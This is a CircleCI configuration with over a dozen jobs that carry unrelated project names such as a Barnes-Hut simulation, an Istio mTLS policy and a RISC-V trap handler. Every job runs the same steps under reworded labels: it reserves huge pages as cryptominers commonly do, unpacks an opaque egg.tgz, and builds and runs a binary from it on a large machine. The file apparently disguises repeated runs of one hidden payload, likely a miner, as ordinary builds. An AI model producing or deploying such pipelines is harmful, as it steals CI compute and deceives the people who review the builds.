version: 2.1

jobs:
  BrambleCreek:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load watershed
          command: |
            printf 'streams 6\n' > creek.cfg
      - run:
          name: Build flow network
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target BrambleCreek -j2
      - run:
          name: Route bramblecreek
          command: LIONSS_LP=1 ./build/BrambleCreek --config creek.cfg --rain 20
  barnesHut:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Seed particles
          command: |
            printf 'n 1000\n' > bodies.txt
      - run:
          name: Build tree code
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target barnesHut -j2
      - run:
          name: Simulate Barnes-Hut
          command: LIONSS_LP=1 ./build/barnesHut --bodies bodies.txt --theta 0.5
  coap-observe:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set resource
          command: |
            printf 'res /temp\n' > coap.cfg
      - run:
          name: Build CoAP server
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target coap-observe -j2
      - run:
          name: Observe resource
          command: LIONSS_LP=1 ./build/coap-observe --conf coap.cfg --max-age 60
  istio_mtls:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Define policy
          command: |
            printf 'mode: STRICT\n' > peerauth.yaml
      - run:
          name: Build sidecar config
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target istio_mtls -j2
      - run:
          name: Apply mTLS policy
          command: LIONSS_LP=1 ./build/istio_mtls --policy peerauth.yaml
  OrcBrawlerLOD2:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Import mesh LODs
          command: |
            mkdir -p assets && printf 'lod0 12000\nlod2 1500\n' > assets/orc.lod
      - run:
          name: Cook character asset
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target OrcBrawlerLOD2 -j2
      - run:
          name: Generate LOD2 impostor
          command: LIONSS_LP=1 ./build/OrcBrawlerLOD2 --mesh assets/orc.lod --ratio 0.12
  verdigris:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Extract sources
          command: tar xzf egg.tgz
      - run:
          name: Prepare build environment
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write palette
          command: |
            printf 'hue = 163\n' > palette.cfg
      - run:
          name: Build color engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target verdigris -j2
      - run:
          name: Quantize palette
          command: LIONSS_LP=1 ./build/verdigris --config palette.cfg --colors 256
  Fenwick:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore build cache
          command: tar xzf egg.tgz
      - run:
          name: Install build tools
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Seed array
          command: |
            printf 'n 1024\n' > bit.cfg
      - run:
          name: Build index tree
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target Fenwick -j2
      - run:
          name: Query fenwick sums
          command: LIONSS_LP=1 ./build/Fenwick --config bit.cfg --ops 100000
  riscv-mret:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Pull reference data
          command: tar xzf egg.tgz
      - run:
          name: Provision SDK
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write trap handler
          command: |
            printf 'csrr t0 mcause\n' > trap.s
      - run:
          name: Assemble trap vector
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target riscv-mret -j2
      - run:
          name: Return from machine trap
          command: LIONSS_LP=1 ./build/riscv-mret --in trap.s --xlen 32
  duckdbprobe:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Stage inputs
          command: tar xzf egg.tgz
      - run:
          name: Set up compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Seed table
          command: |
            printf 'id,v\n1,2\n' > t.csv
      - run:
          name: Build query engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target duckdbprobe -j2
      - run:
          name: Probe query plan
          command: LIONSS_LP=1 ./build/duckdbprobe --csv t.csv --explain
  indigoFox:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack bundle
          command: tar xzf egg.tgz
      - run:
          name: Install dependencies
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Trace route
          command: |
            printf 'hops = 6\n' > fox.cfg
      - run:
          name: Build routing core
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target indigoFox -j2
      - run:
          name: Trace indigo path
          command: LIONSS_LP=1 ./build/indigoFox --config fox.cfg --metric latency
  kvcache_evict:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Rehydrate tree
          command: tar xzf egg.tgz
      - run:
          name: Prepare toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Size cache
          command: |
            printf 'tokens 4096\n' > kv.cfg
      - run:
          name: Build cache manager
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target kvcache_evict -j2
      - run:
          name: Evict KV entries
          command: LIONSS_LP=1 ./build/kvcache_evict --conf kv.cfg --policy lru
  reactionWheel:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch corpus
          command: tar xzf egg.tgz
      - run:
          name: Bring up build env
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set inertia
          command: |
            printf 'I 0.05\n' > rw.cfg
      - run:
          name: Build momentum manager
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target reactionWheel -j2
      - run:
          name: Desaturate reaction wheel
          command: LIONSS_LP=1 ./build/reactionWheel --conf rw.cfg --max-rpm 6000
  nftables-nat:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Checkout vendored deps
          command: tar xzf egg.tgz
      - run:
          name: Install cmake and g++
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write ruleset
          command: |
            printf 'table ip nat\n' > nft.conf
      - run:
          name: Build firewall loader
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target nftables-nat -j2
      - run:
          name: Apply NAT rules
          command: LIONSS_LP=1 ./build/nftables-nat --ruleset nft.conf --flush
  tungsten:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Prime workspace
